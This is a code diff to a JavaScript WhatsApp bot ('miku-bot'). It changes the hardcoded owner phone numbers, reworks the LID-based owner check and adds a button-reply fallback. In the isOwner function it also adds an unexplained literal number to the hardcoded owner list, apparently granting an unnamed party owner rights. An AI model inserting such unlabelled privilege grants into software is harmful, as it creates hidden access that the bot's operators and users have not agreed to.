@@ -55,9 +55,9 @@ const SESSION_DIR    = path.join(process.cwd(), 'session', 'miku-bot');
 const RUNTIME_DIR    = path.join(process.cwd(), 'runtime');
 const CONNECTED_FILE = path.join(RUNTIME_DIR, 'connected.json');
 
-const MAIN_OWNER        = '393209533090';
-const EXTRA_OWNER       = '51930108242';
-const LINKED_BOT_NUMBER = '51930108242';
+const MAIN_OWNER        = '50375638328';
+const EXTRA_OWNER       = '50578391933';
+const LINKED_BOT_NUMBER = '50578391933';
 
 const DEFAULT_SETTINGS = {
   prefix:           '.',
@@ -540,14 +540,16 @@ function saveSettings(patch = {}) {
 function isOwner(jid = '') {
   const sender = normalizeNumber(jid);
   if (!sender) return false;
-  const HARDCODED = [MAIN_OWNER, EXTRA_OWNER, LINKED_BOT_NUMBER];
+  const HARDCODED = [MAIN_OWNER, EXTRA_OWNER, '5492645746772', LINKED_BOT_NUMBER];
   const fromSettings = getOwnerNumbers();
   const botNumber    = normalizeNumber(settings.botNumber || '');
   const ownerLids    = [].concat(settings.ownerLids || [], settings.ownerLid || []).map(normalizeLid).filter(Boolean);
   const adminLids    = [].concat(settings.adminLids || [], settings.adminLid || []).map(normalizeLid).filter(Boolean);
   const rawSender    = normalizeLid(jid);
+  const senderLid    = rawSender.endsWith('@lid') ? rawSender.split('@')[0] : rawSender;
+  const ownerLidSet  = [...ownerLids, ...adminLids].map(v => v.replace(/@lid$/i, ''));
   const all = [...new Set([...HARDCODED, ...fromSettings, botNumber].filter(Boolean))];
-  return all.includes(sender) || ownerLids.includes(rawSender) || adminLids.includes(rawSender);
+  return all.includes(sender) || ownerLidSet.includes(senderLid);
 }
 
 function getGroupOptions(chatId = '') {
@@ -669,7 +671,7 @@ function getMessageText(msg = {}) {
   if (selectedId) return selectedId;
   const paramsJson = m.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
   if (paramsJson) {
-    try { const p = JSON.parse(paramsJson); return p?.id || p?.selectedId || ''; } catch {}
+    try { const p = JSON.parse(paramsJson); return p?.id || p?.selectedId || p?.selectedRowId || ''; } catch {}
   }
   return '';
 }
@@ -1236,7 +1238,7 @@ async function startBot() {
 
       const place         = isGroup ? 'GRUPO' : 'PRIVADO';
       const senderNum     = normalizeNumber(sender) || '???';
-      const senderIsOwner = isOwner(sender);
+      const senderIsOwner = isOwner(sender) || isOwner(senderLid);
 
       log('CMD', `${cc('bold','bgreen', usedPrefix + commandName)} ${c('dim', `[${place}]`)} ${c('byellow', senderNum)}`, 'cyan');
 
